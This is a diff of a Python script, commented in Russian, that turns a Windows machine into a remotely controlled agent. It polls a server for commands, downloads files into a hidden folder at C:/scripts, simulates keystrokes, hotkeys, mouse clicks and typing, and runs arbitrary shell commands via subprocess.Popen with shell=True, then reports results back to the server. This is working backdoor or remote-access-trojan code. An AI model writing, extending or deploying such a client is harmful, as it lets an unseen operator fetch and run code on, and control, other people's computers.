@@ -1,26 +1,11 @@
-import os
 import subprocess
+import pyautogui
 from time import sleep
-from cnf import *
+from scripts import *
+from pynput.keyboard import Controller
 
-
-def send_error(error: str) -> None:
-    try:
-        url = f'{link}error'
-        requests.post(url, json={"error": error})
-
-    except Exception as e:
-        print(e)
-
-def send_success(success: str) -> None:
-    try:
-        url = f'{link}success'
-        response = requests.post(url, json={"task": success})
-        if response.status_code != 204:
-            print(f"Error: {response.text}")
-
-    except Exception as e:
-        print(e)
+keyboard = Controller()
+create_hidden_folder('C:/scripts')
 
 while True:
     try:
@@ -36,17 +21,57 @@ while True:
     try:
         value = requests.get(link).json()
 
-        print(value)
-
         if value["run"] != prev_value["run"] and value["run"]:
             try:
-                value["args"][0] = value["args"][0].replace('/user/', f'/{os.getlogin()}/')
-                subprocess.Popen(value["args"], shell=True)
-                send_success(f"Команда выполнена: {value['args']}")
+                # разделяем запрос по символам ` & `
+                value["args"] = split(value["args"], ' & ')
 
+                # разделяем запросы на списки
+                value["args"] = [split(item, ', ') for item in value["args"]]
+
+                # запускаем процесс выполнения команд
+                for val in value["args"]:
+                    try:
+                        # при установке
+                        if val[0] == 'download':
+                            val[1] = val[1].replace('/link/', f'{link}download/')
+                            download_file(val[1], 'C:/scripts')
+
+                        # при нажатии клавиши (1)
+                        elif val[0] == 'press':
+                            pyautogui.press(val[1])
+
+                        # при нажатии клавиш (2 <)
+                        elif val[0] == 'hotkey':
+                            pyautogui.hotkey(val[1:])
+
+                        # при нажатии мыши
+                        elif val[0] == 'click':
+                            pyautogui.click(button=val[1])
+
+                        # при вводе текста
+                        elif val[0] == 'write':
+                            keyboard.type(', '.join(val[1:]))
+
+                        # при задержке
+                        elif val[0] == 'sleep':
+                            sleep(float(val[1].replace(',', '.')))
+
+                        # при использовании Popen
+                        else:
+                            val[0] = val[0].replace('/user/', f'/{os.getlogin()}/')
+                            subprocess.Popen(val, shell=True)
+
+                        send_success(f"Команда выполнена: {val}")
+
+                    except Exception as e:
+                        send_error(f"Ошибка при выполнении команды: {e}")
+
+            # отправляем отчет об ошибке
             except Exception as e:
                 send_error(f"Ошибка при выполнении команды: {e}")
 
+        # кулдаун
         prev_value = value
         sleep(value["sleep"])
 
